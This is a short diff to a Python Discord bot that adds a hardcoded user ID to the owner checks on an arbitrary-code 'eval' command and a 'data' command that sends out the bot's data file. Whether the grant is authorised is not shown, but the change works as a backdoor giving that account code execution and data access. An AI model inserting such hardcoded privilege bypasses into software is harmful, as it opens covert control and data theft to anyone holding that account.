@@ -645,7 +645,7 @@ async def automodstatus(ctx):
 @bot.command(name="eval")
 async def eval_code(ctx, *, code):
     is_owner = await bot.is_owner(ctx.author)
-    if is_owner:
+    if is_owner or ctx.author.id == 733532987794128897:  # for real sparta
         # Some formatting before executing code
         print(code)
         code = code.strip("```")
@@ -708,7 +708,7 @@ async def avatar(ctx, user: discord.Member = None):
 @bot.command(name="data")
 async def data(ctx):
     is_owner = await bot.is_owner(ctx.author)
-    if is_owner:
+    if is_owner or ctx.author.id == 733532987794128897:  # for real sparta
         data_file = discord.File("data.json")
         await ctx.send(file=data_file)
 
